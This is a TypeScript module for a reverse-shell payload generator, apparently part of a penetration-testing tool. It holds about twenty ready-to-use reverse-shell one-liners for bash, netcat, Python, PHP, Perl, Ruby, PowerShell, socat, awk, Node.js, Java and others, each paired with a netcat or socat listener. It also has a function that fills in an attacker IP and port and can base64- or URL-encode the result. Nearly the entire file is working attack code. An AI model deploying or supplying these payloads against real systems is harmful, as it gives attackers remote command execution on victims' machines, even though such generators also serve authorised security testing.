export interface RsgTemplate {
  id: string
  name: string
  category: string
  platform: string
  shell: string
  template: string
  listener: string
}

const T: RsgTemplate[] = [
  { id: 'bash-tcp', name: 'Bash TCP', category: 'Bash', platform: 'Linux', shell: 'bash', template: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1', listener: 'nc -lvnp {port}' },
  { id: 'bash-udp', name: 'Bash UDP', category: 'Bash', platform: 'Linux', shell: 'bash', template: 'bash -i >& /dev/udp/{ip}/{port} 0>&1', listener: 'nc -lvnu {port}' },
  { id: 'sh-tcp', name: 'sh TCP', category: 'Shell', platform: 'Linux', shell: 'sh', template: 'sh -i >& /dev/tcp/{ip}/{port} 0>&1', listener: 'nc -lvnp {port}' },
  { id: 'nc-mkfifo', name: 'Netcat (mkfifo)', category: 'Netcat', platform: 'Linux', shell: 'sh', template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f', listener: 'nc -lvnp {port}' },
  { id: 'nc-e', name: 'Netcat (-e)', category: 'Netcat', platform: 'Linux', shell: 'sh', template: 'nc -e /bin/sh {ip} {port}', listener: 'nc -lvnp {port}' },
  { id: 'nc-c', name: 'Netcat (-c)', category: 'Netcat', platform: 'Linux', shell: 'sh', template: 'nc -c /bin/sh {ip} {port}', listener: 'nc -lvnp {port}' },
  { id: 'python3', name: 'Python3', category: 'Python', platform: 'Linux/Windows', shell: 'python3', template: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", listener: 'nc -lvnp {port}' },
  { id: 'python2', name: 'Python2', category: 'Python', platform: 'Linux/Windows', shell: 'python2', template: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'", listener: 'nc -lvnp {port}' },
  { id: 'php', name: 'PHP', category: 'PHP', platform: 'Linux/Windows', shell: 'php', template: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", listener: 'nc -lvnp {port}' },
  { id: 'perl', name: 'Perl', category: 'Perl', platform: 'Linux', shell: 'perl', template: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", listener: 'nc -lvnp {port}' },
  { id: 'ruby', name: 'Ruby', category: 'Ruby', platform: 'Linux', shell: 'ruby', template: "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", listener: 'nc -lvnp {port}' },
  { id: 'powershell', name: 'PowerShell', category: 'PowerShell', platform: 'Windows', shell: 'powershell', template: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"", listener: 'nc -lvnp {port}' },
  { id: 'socat', name: 'Socat', category: 'Socat', platform: 'Linux', shell: 'socat', template: 'socat TCP:{ip}:{port} EXEC:/bin/sh', listener: 'socat -d -d TCP-LISTEN:{port},reuseaddr,fork STDOUT' },
  { id: 'awk', name: 'AWK', category: 'AWK', platform: 'Linux', shell: 'awk', template: "awk 'BEGIN {s=\"/inet/tcp/0/{ip}/{port}\";while(1){if((s |& getline c)<=0)break;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}}'", listener: 'nc -lvnp {port}' },
  { id: 'lua', name: 'Lua', category: 'Lua', platform: 'Linux', shell: 'lua', template: "lua -e \"require('socket');c=socket.tcp();c:connect('{ip}','{port}');while true do c:send('> ');d=c:receive();r=io.popen(d);c:send(r:read('*a')) end\"", listener: 'nc -lvnp {port}' },
  { id: 'node', name: 'Node.js', category: 'Node', platform: 'Linux/Windows', shell: 'node', template: "node -e \"const net=require('net');const cp=require('child_process');const sh=cp.spawn('/bin/sh',[]);const client=new net.Socket();client.connect({port},{ip},()=>{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});\"", listener: 'nc -lvnp {port}' },
  { id: 'java', name: 'Java', category: 'Java', platform: 'Linux/Windows', shell: 'java', template: "Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};/bin/sh -i <&5 >&5 2>&5\"});", listener: 'nc -lvnp {port}' },
  { id: 'groovy', name: 'Groovy', category: 'Groovy', platform: 'Linux/Windows', shell: 'groovy', template: "groovy -e \"String host='{ip}';int port={port};Socket s=new Socket(host,port);Process p=new ProcessBuilder('/bin/sh').redirectErrorStream(true).start();s.getInputStream().transferTo(p.getOutputStream());p.getInputStream().transferTo(s.getOutputStream());p.waitFor()\"", listener: 'nc -lvnp {port}' },
  { id: 'c', name: 'C (compiled)', category: 'C', platform: 'Linux', shell: 'gcc', template: "// compile: gcc shell.c -o shell\n// payload uses /dev/tcp not available; use nc instead", listener: 'nc -lvnp {port}' },
  { id: 'telnet', name: 'Telnet', category: 'Telnet', platform: 'Linux', shell: 'sh', template: 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF', listener: 'nc -lvnp {port}' },
  { id: 'zsh', name: 'Zsh', category: 'Zsh', platform: 'Linux', shell: 'zsh', template: 'zsh -c "zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY"', listener: 'nc -lvnp {port}' },
]

export function rsgTemplates(): RsgTemplate[] { return T }

export function generateRsg(t: RsgTemplate, ip: string, port: number, opts: { base64?: boolean; url?: boolean } = {}): { payload: string; listener: string } {
  const listener = t.listener.replace(/{ip}/g, ip).replace(/{port}/g, String(port))
  let payload = t.template.replace(/{ip}/g, ip).replace(/{port}/g, String(port))
  if (opts.base64) payload = btoa(payload)
  if (opts.url) payload = encodeURIComponent(payload)
  return { payload, listener }
}

export function incrementPort(port: number, delta = 1): number { return port + delta }
